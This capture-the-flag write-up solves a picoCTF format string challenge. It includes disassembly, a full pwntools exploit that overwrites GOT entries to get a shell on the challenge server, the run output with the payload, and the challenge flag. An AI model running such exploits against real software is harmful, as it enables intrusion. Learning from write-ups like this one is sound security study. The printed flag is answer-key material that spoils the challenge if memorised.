# echo back
Binary Exploitation, 500 points

## Description:
> This program we found seems to have a vulnerability. Can you get a shell and retreive the flag?

A binary file was attached.

## Solution:

Let's run the executable:
```console
root@kali:/media/sf_CTFs/pico/echo_back# ./echoback
input your message:
Test
Test


Thanks for sending the message!
```

Opening the executable with Radare2, we see that the `vuln` contains most of the logic:
```assembly
[0x080485ab]> pdf
/ (fcn) sym.vuln 152
|   sym.vuln ();
|           ; var int input @ ebp-0x8c
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ ebp-0x4
|           ; CALL XREF from sym.main (0x8048684)
|           0x080485ab      55             push ebp
|           0x080485ac      89e5           mov ebp, esp
|           0x080485ae      57             push edi
|           0x080485af      81ec94000000   sub esp, 0x94
|           0x080485b5      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x080485bb      8945f4         mov dword [local_ch], eax
|           0x080485be      31c0           xor eax, eax
|           0x080485c0      8d9574ffffff   lea edx, [input]
|           0x080485c6      b800000000     mov eax, 0
|           0x080485cb      b920000000     mov ecx, 0x20               ; 32
|           0x080485d0      89d7           mov edi, edx
|           0x080485d2      f3ab           rep stosd dword es:[edi], eax
|           0x080485d4      83ec0c         sub esp, 0xc
|           0x080485d7      6820870408     push str.echo_input_your_message: ; 0x8048720 ; "echo input your message:"
|           0x080485dc      e87ffeffff     call sym.imp.system         ; int system(const char *string)
|           0x080485e1      83c410         add esp, 0x10
|           0x080485e4      83ec04         sub esp, 4
|           0x080485e7      6a7f           push 0x7f                   ; 127
|           0x080485e9      8d8574ffffff   lea eax, [input]
|           0x080485ef      50             push eax
|           0x080485f0      6a00           push 0
|           0x080485f2      e819feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x080485f7      83c410         add esp, 0x10
|           0x080485fa      83ec0c         sub esp, 0xc
|           0x080485fd      8d8574ffffff   lea eax, [input]
|           0x08048603      50             push eax
|           0x08048604      e817feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048609      83c410         add esp, 0x10
|           0x0804860c      83ec0c         sub esp, 0xc
|           0x0804860f      6839870408     push 0x8048739
|           0x08048614      e837feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048619      83c410         add esp, 0x10
|           0x0804861c      83ec0c         sub esp, 0xc
|           0x0804861f      683c870408     push str.Thanks_for_sending_the_message ; 0x804873c ; "Thanks for sending the message!"
|           0x08048624      e827feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048629      83c410         add esp, 0x10
|           0x0804862c      90             nop
|           0x0804862d      8b45f4         mov eax, dword [local_ch]
|           0x08048630      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x08048637      7405           je 0x804863e
|       |   0x08048639      e8f2fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x0804863e      8b7dfc         mov edi, dword [local_4h]
|           0x08048641      c9             leave
\           0x08048642      c3             ret
[0x080485ab]>
```

We can see in the disassembly that `printf` is being called with our input as the format string - creating a Format String Attack:
```console
root@kali:/media/sf_CTFs/pico/echo_back# ./echoback
input your message:
%x
ffed28ec


Thanks for sending the message!
```

We can use this to spawn a shell: 
* We send in "/bin/sh#" as our input, followed by a payload that will override `printf`'s .got.plt entry with `system`'s address. Now, if `printf(input)` is called, what actually will be executed is `system("/bin/sh")`.
* However, we have a small problem: We need `printf` in order to trigger our attack - how do we call it again?
* The trick is to also override the `puts` address with the `vuln` address, so instead of calling `puts("Thanks for sending the message!")` we will actually jump back to `vuln`, this time with `printf` as `system`.

The script:
```python
from pwn import *
import argparse
import os


LOCAL_PATH = "./echoback"
REMOTE_PATH = ["2018shell3.picoctf.com", 22462]

PREFIX = "/bin/sh#"

def get_process(is_remote = False):
    if is_remote:
        return remote(*REMOTE_PATH)
    else:
        return process(LOCAL_PATH)

def send_payload(proc, payload):
    proc.sendlineafter("message:", PREFIX + payload)

def exec_fmt(payload, is_remote = False):
    proc = get_process(is_remote)
    send_payload(proc, payload)
    return proc.recvall()

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--is_remote", help="Connect to remote server?", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
context.binary = e.path

autofmt = FmtStr(exec_fmt)

writes = {e.got['puts']:   e.symbols['vuln'], e.got['printf']: e.plt['system']}
log.info("Address of puts() .got.plt: {}".format(hex(e.got['puts'])))
log.info("Address of printf() .got.plt: {}".format(hex( e.got['printf'])))
log.info("Address of vuln(): {}".format(hex(e.symbols['vuln'])))
log.info("Address of system() .plt: {}".format(hex(e.plt['system'])))

payload = fmtstr_payload(autofmt.offset, writes, numbwritten=len(PREFIX))
log.info("Payload: {}".format(enhex(payload)))

p = get_process(args.is_remote)
send_payload(p, payload)
p.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/echo_back# python exploit.py -r
[*] '/media/sf_CTFs/pico/echo_back/echoback'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './echoback': pid 6930
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6930)
[+] Starting local process './echoback': pid 6934
[+] Receiving all data: Done (76B)
[*] Process './echoback' stopped with exit code 0 (pid 6934)
[+] Starting local process './echoback': pid 6938
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6938)
[+] Starting local process './echoback': pid 6942
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6942)
[+] Starting local process './echoback': pid 6946
[+] Receiving all data: Done (75B)
[*] Process './echoback' stopped with exit code 0 (pid 6946)
[+] Starting local process './echoback': pid 6950
[+] Receiving all data: Done (77B)
[*] Process './echoback' stopped with exit code 0 (pid 6950)
[+] Starting local process './echoback': pid 6954
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6954)
[+] Starting local process './echoback': pid 6958
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6958)
[+] Starting local process './echoback': pid 6962
[+] Receiving all data: Done (82B)
[*] Process './echoback' stopped with exit code 0 (pid 6962)
[*] Found format string offset: 9
[*] Address of puts() .got.plt: 0x804a01c
[*] Address of printf() .got.plt: 0x804a010
[*] Address of vuln(): 0x80485ab
[*] Address of system() .plt: 0x8048460
[*] Payload: 10a0040811a0040812a0040813a004081ca004081da004081ea004081fa004082535366325392468686e253336632531302468686e25313238632531312468686e2534632531322468686e25313633632531332468686e25323138632531342468686e25313237632531352468686e2534632531362468686e
[+] Opening connection to 2018shell3.picoctf.com on port 22462: Done
[*] Switching to interactive mode

/bin/sh#\x10\xa0\x0\x11\xa0\x0\x12\xa0\x0\x13\xa0\x0\x1c\xa0\x0\x1d\xa0\x0\x1e\xa0\x0\x1f\xa0\x0                                                       <                                   \x7f                                                                                                                               \xbd   p                                                                                                                                                                  p                                                                                                                                                                                                                                                                                                                                                       /   /input your message:
/bin/dash: 1: hn: not found
input your message:
$ ls
echoback
echoback.c
flag.txt
xinet_startup.sh
input your message:
$ cat flag.txt
picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_a9521c84}

input your message:
$
[*] Interrupted
[*] Closed connection to 2018shell3.picoctf.com port 22462
```

The flag: picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_a9521c84}